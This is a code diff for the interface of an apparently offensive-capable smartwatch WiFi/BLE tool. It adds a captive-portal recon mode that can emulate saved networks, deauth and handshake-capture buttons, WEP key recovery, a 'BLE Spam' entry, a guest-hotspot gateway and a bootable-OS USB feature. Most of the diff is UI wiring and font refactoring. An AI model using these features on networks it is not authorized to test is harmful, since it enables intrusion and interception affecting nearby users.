+                  nocsif_gateway_ap_ssid_cfg(), &s_tr_ssid_acc, tr_ssid_cb, NULL);
+    wifi_menu_row(content, "Password", NOCSIF_BONE,
+                  nocsif_gateway_ap_secured() ? "WPA2" : "open", &s_tr_pass_acc, tr_pass_cb, NULL);
+    /* Uplink sign-in — get the watch past a captive portal on the network it joins (hotel/cafe). Tap the
+     * status row to check/sign in now. Auto-accept handles simple "tap Continue" pages; Portal-to-phone
+     * relays a login/code portal to a device on the hotspot so you complete it through the watch. */
+    wifi_menu_row(content, "Portal to phone", NOCSIF_BONE,
+                  nocsif_gateway_uplink_passthru_on() ? "on" : "off", &s_tr_pxy_acc, tr_pxy_cb, NULL);
+    wifi_menu_row(content, "Uplink sign-in", NOCSIF_BONE,
+                  nocsif_gateway_uplink_status_str(), &s_tr_up_acc, tr_signin_cb, NULL);
+    wifi_menu_row(content, "WireGuard", NOCSIF_BONE,
+                  nocsif_gateway_tunnel_status_str(), &s_tr_wg_acc, tr_wg_cb, NULL);
+
+    lv_obj_t *foot = lv_label_create(content);
+    lv_label_set_long_mode(foot, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(foot, lv_pct(100));
+    lv_obj_add_style(foot, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(foot, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(foot, 10, 0);
+    lv_label_set_text(foot, "SoftAP + NAT " NOCSIF_DOT " config in /sd/nocsif/gateway " NOCSIF_DOT " authorized use only");
+
+    lv_timer_t *timer = lv_timer_create(tr_tick, 500, NULL);
+    lv_obj_add_event_cb(scr, tr_deleted_cb, LV_EVENT_DELETE, timer);
+    tr_tick(timer);
+    return scr;
+}
+
+/* ============================ M5-P5·4: Captive Portal (active) ========================= *
+ * A captive-portal presentation on the open software AP: a UDP:53 DNS redirector + an HTTP landing
+ * page (from /sd, else built-in), with a live client-interaction log. Start brings the AP up if it is
+ * not already. The interaction rows are plain text lines updated in place (fixed label POOL / static
+ * rows — the same render-WDT discipline as the other live lists). Authorized testing only. */
+#define PT_ROWS 8   /* pooled interaction-log rows (newest first) */
+static lv_obj_t *s_pt_status, *s_pt_start_lbl, *s_pt_info, *s_pt_page_acc, *s_pt_share_acc, *s_pt_rows[PT_ROWS];
 
 static lv_obj_t *build_wifi_portal_pick(void);     /* Web Portal chooser (/sd/nocsif/wifi/portals) */
 static lv_obj_t *build_wifi_portal_netpick(void);  /* emulate a saved network + auto-load its portal */
 
-static void wifi_portal_start_cb(lv_event_t *e) { (void)e; nocsif_wifi_request_portal(!nocsif_wifi_portal_active()); }
+/* Start/Stop routes by mode: with "Share watch WiFi" on, it drives the gateway sign-in gate on the
+ * shared hotspot (guest WiFi); off, it drives the existing recon captive portal (AP-only, no uplink).
+ * Only one owns the single SoftAP at a time. */
+static void wifi_portal_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (nocsif_gateway_share_wanted()) {
+        bool running = nocsif_gateway_portal_active();
+        if (!running) nocsif_wifi_request_portal(false);       /* ensure the recon portal is down */
+        nocsif_gateway_request_portal(!running);
+    } else {
+        if (!nocsif_wifi_portal_active()) { nocsif_gateway_request_portal(false); }
+        nocsif_wifi_request_portal(!nocsif_wifi_portal_active());
+    }
+}
+
+/* "Share watch WiFi" toggle: turns the captive portal into a real guest hotspot (gateway share).
+ * On requires a WiFi uplink and stops the recon portal; off tears the gateway gate + share down. */
+static void wifi_portal_share_cb(lv_event_t *e)
+{
+    (void)e;
+    bool on = !nocsif_gateway_share_wanted();
+    if (on && !nocsif_wifi_connected()) { nocsif_toast("Join a WiFi network first"); return; }
+    if (on) { nocsif_wifi_request_portal(false); nocsif_gateway_request_share(true); }
+    else    { nocsif_gateway_request_portal(false); nocsif_gateway_request_share(false); }
+}
 static void wifi_portal_pick_cb(lv_event_t *e)  { (void)e; lv_obj_t *r = build_wifi_portal_pick(); if (r) nocsif_nav_push(r); }
 static void wifi_portal_netpick_cb(lv_event_t *e){ (void)e; lv_obj_t *r = build_wifi_portal_netpick(); if (r) nocsif_nav_push(r); }
 
@@ -6612,11 +9581,15 @@ static void wifi_portal_tick(lv_timer_t *t)
     if (s_pt_status == NULL) {
         return;
     }
-    bool active = nocsif_wifi_portal_active();
-    unsigned hits = (unsigned)nocsif_wifi_portal_hits();
+    bool sharing = nocsif_gateway_share_wanted();
+    bool active  = sharing ? nocsif_gateway_portal_active() : nocsif_wifi_portal_active();
 
     char buf[96];
-    if (active) {
+    if (sharing) {
+        snprintf(buf, sizeof buf, "guest hotspot " NOCSIF_DOT " %s%s",
+                 nocsif_gateway_status_str(), active ? " " NOCSIF_DOT " sign-in on" : "");
+    } else if (active) {
+        unsigned hits = (unsigned)nocsif_wifi_portal_hits();
         const char *src = nocsif_wifi_portal_page_src();
         snprintf(buf, sizeof buf, "portal up " NOCSIF_DOT " %u hit%s " NOCSIF_DOT " page: %s",
                  hits, hits == 1 ? "" : "s", src[0] ? src : "loading");
@@ -6626,6 +9599,7 @@ static void wifi_portal_tick(lv_timer_t *t)
     wifi_set_label(s_pt_status, buf);
     lv_obj_set_style_text_color(s_pt_status, active ? NOCSIF_VIOLET : NOCSIF_STEEL, 0);
     wifi_set_label(s_pt_start_lbl, active ? "Stop" : "Start");
+    if (s_pt_share_acc) wifi_set_label(s_pt_share_acc, sharing ? "on" : "off");
     if (s_pt_page_acc) {
         const char *sel = nocsif_wifi_portal_selected_page();
         wifi_set_label(s_pt_page_acc, sel[0] ? sel : "built-in");
@@ -6657,7 +9631,7 @@ static void wifi_portal_deleted_cb(lv_event_t *e)
     if (timer) {
         lv_timer_delete(timer);
     }
-    s_pt_status = s_pt_start_lbl = s_pt_info = s_pt_page_acc = NULL;
+    s_pt_status = s_pt_start_lbl = s_pt_info = s_pt_page_acc = s_pt_share_acc = NULL;
     for (int i = 0; i < PT_ROWS; i++) {
         s_pt_rows[i] = NULL;
     }
@@ -6689,6 +9663,10 @@ static lv_obj_t *build_wifi_portal(void)
 
     lv_obj_t *xrow = wifi_menu_row(content, "Start", NOCSIF_VIOLET, NULL, NULL, wifi_portal_start_cb, NULL);
     s_pt_start_lbl = lv_obj_get_child(xrow, 0);
+
+    /* "Share watch WiFi" turns the portal into a real guest hotspot (gateway share + sign-in gate). */
+    wifi_menu_row(content, "Share watch WiFi", NOCSIF_BONE,
+                  nocsif_gateway_share_wanted() ? "on" : "off", &s_pt_share_acc, wifi_portal_share_cb, NULL);
 
     /* Emulate a saved network from the Networks folder: sets the AP SSID / channel / hidden and, if the
      * network file names an associated portal, auto-loads it into Web Portal below. */
@@ -6911,13 +9889,13 @@ static const char *ble_omit_tag_str(void)
  * Bluetooth") are consolidated into the "Bluetooth Explore" hub below — this menu keeps the companion
  * link, the transmit tools, and Signal Hunt. Alphabetical by label. Advertise / Beacon was removed
  * (its build_ble_advertise screen stays registered but delisted, so it's trivially re-added). */
-static const rowspec_t k_ble_rows[] = {   /* alphabetical by label */
-        { "ble.pcap",      "Advert Capture",      NOCSIF_ICON_DRIVE, "off",   NOCSIF_TAG_RUN, nocsif_ble_pcap_tag_str },
+static const rowspec_t k_ble_rows[] = {   /* submenus first, then leaves — alphabetical within each group */
         /* M7 — "BLE Connect" is the phone-companion + controllers hub; all ride the one bonded link
          * (ANCS notifications + AMS media + composite HID controllers over a single iPhone bond). */
         { "phone",         "BLE Connect",         NOCSIF_ICON_PHONE, "phone", NOCSIF_TAG_RUN, nocsif_ble_ancs_tag_str },
-        { "ble.restest",   "BLE Spam",            NOCSIF_ICON_RADIO, "off",   NOCSIF_TAG_RUN, nocsif_ble_restest_tag_str },
         { "ble.explore",   "Bluetooth Explore",   NOCSIF_ICON_BLE,   NULL,    NOCSIF_TAG_NONE },
+        { "ble.pcap",      "Advert Capture",      NOCSIF_ICON_DRIVE, "off",   NOCSIF_TAG_RUN, nocsif_ble_pcap_tag_str },
+        { "ble.restest",   "BLE Spam",            NOCSIF_ICON_RADIO, "off",   NOCSIF_TAG_RUN, nocsif_ble_restest_tag_str },
         { "ble.omit",      "Omitted Devices",     NOCSIF_ICON_SYS,   "",      NOCSIF_TAG_VALUE, ble_omit_tag_str },
         { "hunt",          "Signal Hunt",         NOCSIF_ICON_HUNT,  "pick",  NOCSIF_TAG_RUN, nocsif_ble_hunt_tag_str },
 };
@@ -10360,7 +13338,7 @@ static lv_obj_t *hunt_ctrl_btn(lv_obj_t *parent, const char *txt, lv_event_cb_t 
     lv_obj_set_style_bg_color(b, NOCSIF_EDGE2, LV_STATE_PRESSED);
     lv_obj_set_style_bg_opa(b, LV_OPA_COVER, LV_STATE_PRESSED);
     lv_obj_t *l = lv_label_create(b);
-    lv_obj_set_style_text_font(l, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(l, &nocsif_mono_12);
     lv_obj_set_style_text_color(l, NOCSIF_STEEL, 0);
     lv_label_set_text(l, txt);
     lv_obj_center(l);
@@ -10518,7 +13496,7 @@ static lv_obj_t *build_ble_hunt(void)
     s_bh_status = lv_label_create(s_bh_pick);
     lv_label_set_long_mode(s_bh_status, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(s_bh_status, lv_pct(100));
-    lv_obj_set_style_text_font(s_bh_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_bh_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_bh_status, NOCSIF_STEEL, 0);
     lv_label_set_text(s_bh_status, "pick a device to hunt");
     lv_obj_set_style_pad_bottom(s_bh_status, 8, 0);
@@ -10551,7 +13529,7 @@ static lv_obj_t *build_ble_hunt(void)
     lv_obj_add_event_cb(s_bh_more, ble_hunt_page_cb, LV_EVENT_CLICKED, NULL);
     lv_obj_add_flag(s_bh_more, LV_OBJ_FLAG_HIDDEN);
     s_bh_more_lbl = lv_label_create(s_bh_more);
-    lv_obj_set_style_text_font(s_bh_more_lbl, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_bh_more_lbl, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_bh_more_lbl, NOCSIF_VIOLET, 0);
     lv_obj_set_width(s_bh_more_lbl, lv_pct(100));
     lv_obj_set_style_text_align(s_bh_more_lbl, LV_TEXT_ALIGN_CENTER, 0);
@@ -10603,7 +13581,7 @@ static lv_obj_t *build_ble_hunt(void)
     s_bh_seen = lv_label_create(who);                  /* meta/status line under the name */
     lv_label_set_long_mode(s_bh_seen, LV_LABEL_LONG_DOT);
     lv_obj_set_width(s_bh_seen, lv_pct(100));
-    lv_obj_set_style_text_font(s_bh_seen, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(s_bh_seen, &nocsif_mono_11);
     lv_obj_set_style_text_color(s_bh_seen, NOCSIF_STEEL, 0);
     lv_label_set_text(s_bh_seen, "");
 
@@ -10628,12 +13606,12 @@ static lv_obj_t *build_ble_hunt(void)
     lv_obj_set_style_text_color(s_bh_pct, NOCSIF_WHITE, 0);
     lv_label_set_text(s_bh_pct, "\xE2\x80\x94");       /* an em dash until it's heard */
     lv_obj_t *unit = lv_label_create(pctrow);
-    lv_obj_set_style_text_font(unit, &nocsif_mono_15, 0);
+    nocsif_label_font_scaled(unit, &nocsif_mono_15);
     lv_obj_set_style_text_color(unit, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_bottom(unit, 8, 0);
     lv_label_set_text(unit, "%");
     s_bh_dbm = lv_label_create(pcol);
-    lv_obj_set_style_text_font(s_bh_dbm, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(s_bh_dbm, &nocsif_mono_11);
     lv_obj_set_style_text_color(s_bh_dbm, NOCSIF_ASH, 0);
     lv_label_set_text(s_bh_dbm, "acquiring\xE2\x80\xA6");
     s_bh_trend = NULL;                                  /* retired: brightness now replaces the warmer/colder text */
@@ -10719,7 +13697,7 @@ static lv_obj_t *build_ble_hunt(void)
     lv_obj_center(s_bh_spin);
     /* (No spin icon: the custom mono font subset has no LV_SYMBOL glyphs, so it rendered as a missing-glyph box — "the weird square in the middle". The text alone is the prompt now.) */
     s_bh_bearing = lv_label_create(s_bh_spin);
-    lv_obj_set_style_text_font(s_bh_bearing, &nocsif_mono_13, 0);
+    nocsif_label_font_scaled(s_bh_bearing, &nocsif_mono_13);
     lv_obj_set_style_text_color(s_bh_bearing, NOCSIF_BONE, 0);
     lv_label_set_text(s_bh_bearing, "spin to set the bearing");
 
@@ -10913,7 +13891,7 @@ static void devinfo_decode_ad(lv_obj_t *parent, const uint8_t *data, uint8_t len
         lv_obj_t *lab = lv_label_create(parent);
         lv_label_set_long_mode(lab, LV_LABEL_LONG_WRAP);
         lv_obj_set_width(lab, lv_pct(100));
-        lv_obj_set_style_text_font(lab, &nocsif_mono_11, 0);
+        nocsif_label_font_scaled(lab, &nocsif_mono_11);
         lv_obj_set_style_text_color(lab, NOCSIF_BONE, 0);
         lv_obj_set_style_pad_bottom(lab, 5, 0);
         lv_label_set_text(lab, linebuf);
@@ -10926,7 +13904,7 @@ static void devinfo_section(lv_obj_t *content, const char *txt)
 {
     lv_obj_t *l = lv_label_create(content);
     lv_obj_set_width(l, lv_pct(100));
-    lv_obj_set_style_text_font(l, &nocsif_mono_11, 0);
+    nocsif_label_font_scaled(l, &nocsif_mono_11);
     lv_obj_set_style_text_color(l, NOCSIF_STEEL, 0);
     lv_obj_set_style_pad_top(l, 10, 0);
     lv_obj_set_style_pad_bottom(l, 4, 0);
@@ -11044,13 +14022,13 @@ static void ble_devinfo_open(const uint8_t addr[6], uint8_t addr_type, const cha
 
     s_di_cat = lv_label_create(content);
     lv_obj_set_width(s_di_cat, lv_pct(100));
-    lv_obj_set_style_text_font(s_di_cat, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_di_cat, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_di_cat, nocsif_accent(), 0);
     lv_label_set_text(s_di_cat, found ? devinfo_category(&d) : "Device");
 
     s_di_live = lv_label_create(content);
     lv_obj_set_width(s_di_live, lv_pct(100));
-    lv_obj_set_style_text_font(s_di_live, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_di_live, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_di_live, NOCSIF_ASH, 0);
     lv_obj_set_style_pad_bottom(s_di_live, 6, 0);
     lv_label_set_text(s_di_live, "acquiring\xE2\x80\xA6");
@@ -11165,7 +14143,7 @@ static lv_obj_t *build_ble_omit(void)
 
     s_om_status = lv_label_create(content);
     lv_obj_set_width(s_om_status, lv_pct(100));
-    lv_obj_set_style_text_font(s_om_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_om_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_om_status, NOCSIF_STEEL, 0);
     { char b[48]; snprintf(b, sizeof b, "%d hidden " NOCSIF_DOT " tap to un-hide", n);
       lv_label_set_text(s_om_status, b); }
@@ -11206,13 +14184,13 @@ static lv_obj_t *build_ble_omit(void)
         lv_obj_t *nm = lv_label_create(row);
         lv_label_set_long_mode(nm, LV_LABEL_LONG_DOT);
         lv_obj_set_width(nm, lv_pct(100));
-        lv_obj_set_style_text_font(nm, &nocsif_mono_13, 0);
+        nocsif_label_font_scaled(nm, &nocsif_mono_13);
         lv_obj_set_style_text_color(nm, NOCSIF_BONE, 0);
         lv_label_set_text(nm, o.name[0] ? o.name : "(unnamed)");
 
         lv_obj_t *mt = lv_label_create(row);
         lv_obj_set_width(mt, lv_pct(100));
-        lv_obj_set_style_text_font(mt, &nocsif_mono_11, 0);
+        nocsif_label_font_scaled(mt, &nocsif_mono_11);
         lv_obj_set_style_text_color(mt, NOCSIF_ASH, 0);
         char mac[40];
         snprintf(mac, sizeof mac, "%02X:%02X:%02X:%02X:%02X:%02X " NOCSIF_DOT " tap to remove",
@@ -11323,7 +14301,7 @@ static void devinfo_decode_ie(lv_obj_t *parent, const uint8_t *data, int len)
         lv_obj_t *lab = lv_label_create(parent);
         lv_label_set_long_mode(lab, LV_LABEL_LONG_WRAP);
         lv_obj_set_width(lab, lv_pct(100));
-        lv_obj_set_style_text_font(lab, &nocsif_mono_11, 0);
+        nocsif_label_font_scaled(lab, &nocsif_mono_11);
         lv_obj_set_style_text_color(lab, NOCSIF_BONE, 0);
         lv_obj_set_style_pad_bottom(lab, 5, 0);
         lv_label_set_text(lab, line);
@@ -11404,6 +14382,28 @@ static void wifi_devinfo_hs_cb(lv_event_t *e)       /* AP only: channel-locked h
     nocsif_nav_push(build_wifi_handshake());
 }
 
+static void wifi_devinfo_wep_cb(lv_event_t *e)     /* AP only: channel-locked WEP key recovery */
+{
+    (void)e;
+    memcpy(s_wep_target.bssid, s_wd_mac, 6);
+    /* Real SSID for the post-recovery rejoin ("" = hidden). s_wd_name may be a MAC string for a
+     * hidden AP, so pull the SSID straight from the live AP table instead. */
+    s_wep_ssid_ui[0] = '\0';
+    int an = nocsif_wifi_mon_ap_count();
+    for (int i = 0; i < an; i++) {
+        nocsif_wifi_mon_ap_t a;
+        if (nocsif_wifi_mon_ap_get(i, &a) && memcmp(a.bssid, s_wd_mac, 6) == 0) {
+            snprintf(s_wep_ssid_ui, sizeof s_wep_ssid_ui, "%s", a.ssid);
+            break;
+        }
+    }
+    snprintf(s_wep_target.name, sizeof s_wep_target.name, "%s",
+             s_wep_ssid_ui[0] ? s_wep_ssid_ui : "(hidden)");
+    s_wep_target.channel = s_wd_ch;
+    s_wep_target.valid   = true;
+    nocsif_nav_push(build_wifi_wep_recover());   /* channel-locked to this AP */
+}
+
 static void wifi_devinfo_tick(lv_timer_t *t)
 {
     (void)t;
@@ -11446,6 +14446,7 @@ static void wifi_devinfo_open(uint8_t kind, const uint8_t mac[6], const char *na
     int8_t rssi = 0; uint32_t age = 0; unsigned frames = 0; uint8_t ch = 0;
     bool found = wifi_devinfo_look(kind, mac, &rssi, &age, &frames, &ch);
     s_wd_ch = ch;
+    bool wep_ap = false;   /* set when this AP advertises WEP → offer key recovery in the actions row */
 
     lv_obj_t *content;
     lv_obj_t *scr = nocsif_screen_scaffold(kind == WH_AP ? "Network" : kind == WH_STA ? "Client" : "Probe", NULL, &content);
@@ -11464,13 +14465,13 @@ static void wifi_devinfo_open(uint8_t kind, const uint8_t mac[6], const char *na
 
     s_wd_cat = lv_label_create(content);
     lv_obj_set_width(s_wd_cat, lv_pct(100));
-    lv_obj_set_style_text_font(s_wd_cat, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_wd_cat, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_wd_cat, nocsif_accent(), 0);
     lv_label_set_text(s_wd_cat, kind == WH_AP ? "Access Point" : kind == WH_STA ? "Client / Station" : "Probe Request");
 
     s_wd_live = lv_label_create(content);
     lv_obj_set_width(s_wd_live, lv_pct(100));
-    lv_obj_set_style_text_font(s_wd_live, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_wd_live, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_wd_live, NOCSIF_ASH, 0);
     lv_obj_set_style_pad_bottom(s_wd_live, 6, 0);
     lv_label_set_text(s_wd_live, "acquiring\xE2\x80\xA6");
@@ -11486,6 +14487,7 @@ static void wifi_devinfo_open(uint8_t kind, const uint8_t mac[6], const char *na
         for (int i = 0; i < an; i++) { nocsif_wifi_mon_ap_t a;
             if (nocsif_wifi_mon_ap_get(i, &a) && memcmp(a.bssid, mac, 6) == 0) { ap = a; have_ap = true; break; } }
         if (have_ap) {
+            wep_ap = (ap.security == NOCSIF_WIFI_SEC_WEP);
             snprintf(line, sizeof line, "security " NOCSIF_DOT " %s", nocsif_wifi_sec_str(ap.security));
             nocsif_content_line(content, line, &nocsif_mono_12, NOCSIF_STEEL, 2);
             if (ap.vendor[0]) { snprintf(line, sizeof line, "vendor " NOCSIF_DOT " %s", ap.vendor);
@@ -11565,7 +14567,10 @@ static void wifi_devinfo_open(uint8_t kind, const uint8_t mac[6], const char *na
     hunt_ctrl_btn(ctrls, "omit", wifi_devinfo_omit_cb, NULL);
     if (kind == WH_AP) {
         hunt_ctrl_btn(ctrls, "deauth", wifi_devinfo_deauth_cb, NULL);
-        hunt_ctrl_btn(ctrls, "capture", wifi_devinfo_hs_cb, NULL);
+        /* WEP APs have no 4-way handshake to capture — offer key recovery in its place (mirrors the
+         * Live Networks AP detail). Non-WEP keeps the PMKID/handshake capture button. */
+        if (wep_ap) hunt_ctrl_btn(ctrls, "wep key", wifi_devinfo_wep_cb, NULL);
+        else        hunt_ctrl_btn(ctrls, "capture", wifi_devinfo_hs_cb, NULL);
     }
 
     lv_timer_t *timer = lv_timer_create(wifi_devinfo_tick, 700, NULL);
@@ -11616,7 +14621,7 @@ static lv_obj_t *build_wifi_omit(void)
     int n = nocsif_wifi_omit_count();
     s_wom_status = lv_label_create(content);
     lv_obj_set_width(s_wom_status, lv_pct(100));
-    lv_obj_set_style_text_font(s_wom_status, &nocsif_mono_12, 0);
+    nocsif_label_font_scaled(s_wom_status, &nocsif_mono_12);
     lv_obj_set_style_text_color(s_wom_status, NOCSIF_STEEL, 0);
     { char b[56]; snprintf(b, sizeof b, "%d hidden " NOCSIF_DOT " tap to un-hide " NOCSIF_DOT " (not on Join)", n);
       lv_label_set_text(s_wom_status, b); }
@@ -11656,13 +14661,13 @@ static lv_obj_t *build_wifi_omit(void)
         lv_obj_t *nm = lv_label_create(row);
         lv_label_set_long_mode(nm, LV_LABEL_LONG_DOT);
         lv_obj_set_width(nm, lv_pct(100));
-        lv_obj_set_style_text_font(nm, &nocsif_mono_13, 0);
+        nocsif_label_font_scaled(nm, &nocsif_mono_13);
         lv_obj_set_style_text_color(nm, NOCSIF_BONE, 0);
         lv_label_set_text(nm, o.name[0] ? o.name : "(unnamed)");
 
         lv_obj_t *mt = lv_label_create(row);
         lv_obj_set_width(mt, lv_pct(100));
-        lv_obj_set_style_text_font(mt, &nocsif_mono_11, 0);
+        nocsif_label_font_scaled(mt, &nocsif_mono_11);
         lv_obj_set_style_text_color(mt, NOCSIF_ASH, 0);
         char mac[40];
         snprintf(mac, sizeof mac, "%02X:%02X:%02X:%02X:%02X:%02X " NOCSIF_DOT " tap to remove",
@@ -12324,7 +15329,7 @@ static void phone_popup_ex(const nocsif_ble_phone_t *p, bool is_hid)
     lv_label_set_long_mode(title, LV_LABEL_LONG_WRAP);
     lv_obj_set_width(title, lv_pct(100));
     lv_label_set_text(title, p->name);
-    lv_obj_set_style_text_font(title, &nocsif_mono_18, 0);
+    nocsif_label_font_scaled(title, &nocsif_mono_18);
     lv_obj_set_style_text_color(title, NOCSIF_BONE, 0);
     lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
 
@@ -12497,14 +15502,14 @@ static lv_obj_t *build_connect_phone(void)
     /* One menu list: Bluetooth master · Controllers · Disconnect · Saved devices · Notifications.
      * "Connect" is gone — turning the Bluetooth master on auto-advertises so a device connects on its own,
      * and that same bond is what Controllers drives (one iPhone bond = notifications + media + HID). */
-    lv_obj_t *list = nocsif_menu_list(content);   /* rows alphabetical by label (master stays first) */
+    lv_obj_t *list = nocsif_menu_list(content);   /* master stays first, then the submenu, then leaves A-Z */
     add_config_row(list, NOCSIF_ICON_BLE,  "Bluetooth",             bt_master_tag,        bt_master_click_cb);
     phone_action_row(list, NOCSIF_ICON_KEY, "Controllers",          controllers_drill_cb);
     phone_action_row(list, NOCSIF_ICON_PHONE, "Disconnect from device", phone_disconnect_cb);
+    phone_action_row(list, NOCSIF_ICON_BELL, "Phone alerts",        open_phone_alert_cfg);
     add_config_row(list, NOCSIF_ICON_BELL,  "Phone notifications",   phone_notif_tag,      phone_notif_click_cb);
     add_config_row(list, NOCSIF_ICON_PHONE, "Saved devices",         saved_phones_tag,     saved_phones_drill_cb);
     phone_action_row(list, NOCSIF_ICON_MSG, "Show phone keyboard",  ios_kbd_toggle_cb);
-    phone_action_row(list, NOCSIF_ICON_BELL, "Phone alerts",        open_phone_alert_cfg);
     /* Media remote moved to Controllers; Popup Connect removed (iOS has no keyboard pop-up). */
 
     /* Explain the one real cost of leaving Bluetooth on, so it reads as a deliberate trade rather than
@@ -13460,6 +16465,178 @@ static void usb_rescan_status_timer_cb(lv_timer_t *t)
     }
 }
 
+/* ---- Cyber > USB Gadget > Bootable OS (Phase 0) --------------------------------------------- *
+ * Serve an OS image file on the shared card to a PC as a READ-ONLY bootable USB disk. Tapping the
+ * row finds the first .iso/.img in /sd/nocsif/bootos, serves it (bootos.c → usb_gadget BOOTOS mode),
+ * and shows a full-screen "plug into a computer" overlay with all auto-sleep suspended. Any swipe
+ * exits, which detaches the disk and closes the image (mid-boot exit fully exits). Phase 1 turns this
+ * row into a list ("Download TailsOS" + the images on the card, with bootability labels). */
+static lv_obj_t *s_bootos_overlay;
+
+static void bootos_overlay_dismiss(void)
+{
+    nocsif_bootos_stop();                         /* detach the disk + close the image */
+    if (s_bootos_overlay) {
+        lv_obj_delete(s_bootos_overlay);
+        s_bootos_overlay = NULL;
+    }
+    nocsif_ui_background_raise_corner_masks();     /* restore the rounded-corner masks */
+    lv_display_trigger_activity(NULL);             /* resume the normal inactivity clock */
+}
+
+static void bootos_overlay_gesture_cb(lv_event_t *e)
+{
+    (void)e;
+    lv_indev_t *indev = lv_indev_active();
+    if (indev == NULL) {
+        return;
+    }
+    (void)lv_indev_get_gesture_dir(indev);         /* any swipe direction exits */
+    bootos_overlay_dismiss();
+}
+
+static void bootos_show_overlay(void)
+{
+    if (s_bootos_overlay != NULL) {
+        return;
+    }
+    lv_obj_t *ov = lv_obj_create(lv_layer_top());
+    s_bootos_overlay = ov;
+    lv_obj_remove_style_all(ov);
+    lv_obj_set_size(ov, lv_pct(100), lv_pct(100));
+    lv_obj_align(ov, LV_ALIGN_CENTER, 0, 0);
+    lv_obj_set_style_bg_color(ov, lv_color_black(), 0);
+    lv_obj_set_style_bg_opa(ov, LV_OPA_COVER, 0);
+    lv_obj_remove_flag(ov, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_flag(ov, LV_OBJ_FLAG_CLICKABLE);    /* so the press lands on the overlay */
+    /* LVGL v9.3 delivers a swipe to the top-most GESTURE_BUBBLE-flagged ancestor; clear it here so the
+     * gesture fires THIS overlay's handler (same fix as the Alert card) instead of bubbling to the
+     * screen underneath — otherwise swipe-to-exit never fires and you're stuck (needs RST). */
+    lv_obj_remove_flag(ov, LV_OBJ_FLAG_GESTURE_BUBBLE);
+    lv_obj_add_event_cb(ov, bootos_overlay_gesture_cb, LV_EVENT_GESTURE, NULL);
+    lv_obj_set_flex_flow(ov, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(ov, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+
+    lv_obj_t *title = lv_label_create(ov);
+    lv_label_set_text(title, "Bootable OS");
+    lv_obj_set_style_text_font(title, &nocsif_serif_23, 0);
+    lv_obj_set_style_text_color(title, NOCSIF_WHITE, 0);
+    lv_obj_set_style_pad_bottom(title, 14, 0);
+
+    lv_obj_t *msg = lv_label_create(ov);
+    lv_label_set_long_mode(msg, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(msg, lv_pct(82));
+    lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
+    lv_label_set_text(msg, "Plug into a computer\nand boot from USB");
+    nocsif_label_font_scaled(msg, &nocsif_mono_15);
+    lv_obj_set_style_text_color(msg, NOCSIF_BONE, 0);
+
+    lv_obj_t *hint = lv_label_create(ov);
+    lv_label_set_text(hint, "swipe to exit");
+    nocsif_label_font_scaled(hint, &nocsif_mono_12);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_top(hint, 24, 0);
+
+    nocsif_ui_background_raise_corner_masks();      /* keep the rounded corners above the overlay */
+    lv_display_trigger_activity(NULL);
+}
+
+/* Serve a specific image path: arm bootos + raise the black overlay. Shared by the list rows. */
+static void bootos_serve_path(const char *path)
+{
+    esp_err_t r = nocsif_bootos_serve(path);
+    if (r != ESP_OK) {
+        nocsif_toast("Couldn't start Bootable OS (see log).");
+        return;
+    }
+    bootos_show_overlay();
+}
+
+/* The Bootable OS list screen (Phase 1): "Download TailsOS" at top, then each image on the card with a
+ * bootability label; tap an image to serve it (black overlay, swipe to exit). */
+#define BOOTOS_LIST_MAX 16
+static nocsif_bootos_entry_t s_boot_list[BOOTOS_LIST_MAX];
+
+static lv_obj_t *build_bootos_download(void);   /* defined with the shared download screen below */
+
+static void bootos_download_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!nocsif_ui_require_sd()) {
+        return;
+    }
+    nocsif_nav_push(build_bootos_download());
+}
+
+static void bootos_image_cb(lv_event_t *e)
+{
+    int i = (int)(intptr_t)lv_event_get_user_data(e);
+    if (i < 0 || i >= BOOTOS_LIST_MAX || s_boot_list[i].name[0] == '\0') {
+        return;
+    }
+    char path[320];
+    snprintf(path, sizeof path, "%s/%s", NOCSIF_BOOTOS_DIR, s_boot_list[i].name);
+    bootos_serve_path(path);
+}
+
+static lv_obj_t *build_bootos_list(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(
+        "Bootable OS", "pick an image " NOCSIF_DOT " serve it to a PC", &content);
+
+    nocsif_band(content, "GET");
+    lv_obj_t *get = nocsif_menu_list(content);
+    lv_obj_t *dl = nocsif_menu_add_row(get, NOCSIF_ICON_DRIVE, "Download TailsOS", NULL, NULL,
+                                       NOCSIF_TAG_NONE, false, NULL);
+    lv_obj_add_flag(dl, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_add_event_cb(dl, bootos_download_cb, LV_EVENT_CLICKED, NULL);
+
+    nocsif_band(content, "ON THE CARD");
+    memset(s_boot_list, 0, sizeof s_boot_list);
